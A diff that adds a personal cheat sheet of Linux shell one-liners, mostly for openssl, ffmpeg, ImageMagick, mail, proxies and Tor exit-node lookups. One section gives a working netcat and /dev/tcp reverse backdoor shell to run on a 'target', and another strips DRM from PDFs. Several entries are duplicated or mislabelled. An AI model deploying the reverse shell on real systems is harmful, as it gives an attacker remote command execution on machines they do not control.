@@ -1,0 +1,191 @@
+# openssl generate 1024 RSA private key passphrased with des3
+openssl genrsa -des3 -out server.key 1024
+
+# openssl generate csr certificate signign request
+openssl req -new -key server.key -out server.csr
+
+# openssl remove passphrase from key
+openssl rsa -in server-passphrased.key -out server.key
+
+# Generate self-signed certificate
+openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
+
+# easy curl your ip
+curl curlmyip.com
+
+# Gnome libnotify alert balloon
+notify-send "test" "dialog-information"
+
+# HTTP Get request
+exec 3<>/dev/tcp/www.google.com/80
+echo -e "GET / HTTP/1.1\n\n" >&3
+cat <&3
+
+# Send file as attachment through command line mail
+uuencode file_name file_name | mailx -s "Subject of mail" "receive@domain.com"
+
+Get IP address from Tor exit-node
+Reciprocally, we could get the node name from a give Tor IP address =>
+ip2node() { curl -s -d "QueryIP=$1" http://torstatus.blutmagie.de/tor_exit_query.php | grep -oP "Server name:.*'>\K\w+" ; }
+ip2node 204.8.156.142
+BostonUCompSci
+#
+curl -s -d "CSField=Name" -d "CSInput=BostonUCompSci" http://torstatus.blutmagie.de/index.php | grep -oP "ip=\K(\d+)(\.\d+){3}"
+
+Reverse Backdoor Command Shell using Netcat
+First, start a listening service on your box.
+nc -l 8080 -vvv &
+On the target you will create a new descriptor which is assigned to a network node. Then you will read and write to that descriptor.
+exec 5<>/dev/tcp/<your_box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done
+You can send it to the background like this:
+(exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5;) &
+Now everything you type in our local listening server will get executed on the target and the output of the commands will be piped back to the client.
+#
+exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# Capture desktop video to mpg
+ffmpeg -f x11grab -s wxga -r 25 -i :0.0+1366,0 -qscale 0 /tmp/out.mpg
+
+#random bash color
+echo -e "\e[3$(( $RANDOM * 6 / 32767 + 1 ))mHello World!"
+
+#Download images from a 4chan thread
+function 4chandl () { wget -e robots=off -nvcdp -t 0 -Hkrl 0 -I \*/src/ 
+-P . "$1" }
+
+#SQL Dumps to separate files
+mysql -e 'show databases' -s --skip-column-names | egrep -v 
+"^(test|mysql|performance_schema|information_schema)$" | parallel --gnu 
+"mysqldump --routines {} > {}_daily.sql"
+
+#threads and process of user
+ps -eLF | grep ^user
+
+# rip drm off pdf with ghostscript
+mkdir -p drmfree; for i in *.pdf; do echo "Processing $i";
+gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=drmfree/OUTPUT.pdf -c 
+.setpdfwrite -f "$i"; (cd drmfree; mv {OUTPUT.pdf,"$i"_FREE.pdf}); done
+
+# Batch resize all images to a width of 'X' pixels while maintaing the 
+aspect ratio
+mogrify -resize SIZE_IN_PIXELS *.jpg
+
+# convert videos to avi
+mencoder FILENAME.3gp -ovc lavc -lavcopts vcodec=msmpeg4v2 -oac mp3lame 
+-lameopts vbr=3 -o FILENAME.avi
+
+# take screenshot with imagemagick
+import -window root -quality 98 screenshot.png
+
+# list image attributes
+for file in *.jpg; do identify -format '%f %b %Q %w %h' $file; done
+
+# encrypt image
+read -s PASS; echo $PASS | convert sensitive.jpg -encipher - -depth 8 
+png24:hidden.png
+
+# text to image with transparent bg
+read -s PASS; echo $PASS | convert sensitive.jpg -encipher - -depth 8 
+png24:hidden.png
+
+# Compose 2 images on top of eac other
+composite -geometry 96x96+250+70 foreground.jpg background.jpg image.jpg
+
+# Create a video using an audio file and a single image
+ffmpeg -loop 1 -i image.png -i sound.mp3 -shortest video.mp4
+
+# Take a webcam image
+-y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0 
+~/webcam-$(date +%m_%d_%Y_%H_%M).jpeg
+
+# Take a webcam image
+read && ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i 
+/dev/video0 ~/webcam-$(date +%m_%d_%Y_%H_%M).jpeg
+
+# Stream system sounds over rtmp
+sox -d -p | ffmpeg -i pipe:0 -f flv -preset ultrafast -tune zerolatency 
+rtmp://localhost/live/livestream
+
+# Extrac audio from video
+ffmpeg -i source.mpg -f s16le -acodec pcm_s16le audio.raw
+
+# Video file to sequence of images
+ffmpeg -i source.mpg -r 24 -f image2 still-%6d.png
+
+# capture screen and mic with ffmpeg alsa
+a=$(xwininfo |gawk 'BEGIN {FS="[x+ \t]*"} /-geometry/ {print 
+int(($3+1)/2)*2"x"int(($4+1)/2)*2"+"$5"+"$6}') ; echo ${a} ; ffmpeg -f 
+x11grab -s ${a} -r 10 -i :0.0 -sameq -f mp4 -s wvga -y /tmp/out.mpg
+
+# DVD rip with ffmpeg
+ffmpeg -i 
+concat:VTS_02_1.VOB\|VTS_02_2.VOB\|VTS_02_3.VOB\|VTS_02_4.VOB\|VTS_02_5.VOB 
+-map 0:v:0 -map 0:a:0 -codec:a libvo_aacenc -ab 128 -codec:v libx264 
+-vpre libx264-ipod640 movie.mp4
+
+# Live stream remote desktop over ssh w/ ffmpeg
+ssh user@host "ffmpeg -f x11grab -r 5 -s 1280x720 -i :0 -f avi -" | 
+ffplay - &>/dev/null
+
+# flv/mp4 -> ogg/mp3 
+ffmpeg -i video.flv audio.ogg
+
+# Get video info from file
+ffprobe video.flv
+
+# Video thumbnail
+ffmpeg -ss 5 -i video.avi -vframes 1 -s 320x240 thumb.jpg
+
+# Dump audio stream from FLV w/ ffmpeg
+ffmpeg -ss 5 -i video.avi -vframes 1 -s 320x240 thumb.jpg
+
+# Create audio soundtrack to a series of images to FLV
+ffmpeg -t 300 -r '0.5' -i head-%03d.png -i ../TvQuran.com__144.mp3 
+-acodec copy muxed.flv
+
+# DVD ripping with ffmpeg
+cat VIDEO_TS/VTS_01_[1234].VOB | nice ffmpeg -i - -s 512x384 -vcodec 
+libtheora -acodec libvorbis ~/Videos/dvd_rip.ogg
+
+# FLV to AVI
+ffmpeg -i file.flv file.avi
+
+# Split a large video
+ffmpeg -i 100_0029.MOV -ss 00:00:00 -t 00:04:00 100_0029_1.MOV
+
+# Most commonly used bash commands
+awk '{print $1}' ~/.bash_history | sort | uniq -c | sort -rn | head -n 10
+
+# rename directory with Search and replace - in this case, - to _
+export dirname="Adafruit-GFX-Library-master"; mv "$dirname" ${dirname//-/_};
+
+# Diff 2 files with a common base:
+diff {alpha,beta}site/config/Config.pl
+
+# Encrypt/decrypt a string from the command line
+echo 'HelloWorld!' | gpg --symmetric | base64
+
+# Set and unset proxy
+function proxy(){
+     echo -n "username:"
+     read -e username
+     echo -n "password:"
+     read -es password
+     export http_proxy="http://$username:$password@proxyserver:8080/"
+     export https_proxy=$http_proxy
+     export ftp_proxy=$http_proxy
+     export rsync_proxy=$http_proxy
+     export no_proxy="localhost,127.0.0.1,localaddress,.localdomain.com"
+     echo -e "\nProxy environment variable set."
+ }
+ function proxyoff(){
+     unset HTTP_PROXY
+     unset http_proxy
+     unset HTTPS_PROXY
+     unset https_proxy
+     unset FTP_PROXY
+     unset ftp_proxy
+     unset RSYNC_PROXY
+     unset rsync_proxy
+     echo -e "\nProxy environment variable removed."
+ } 
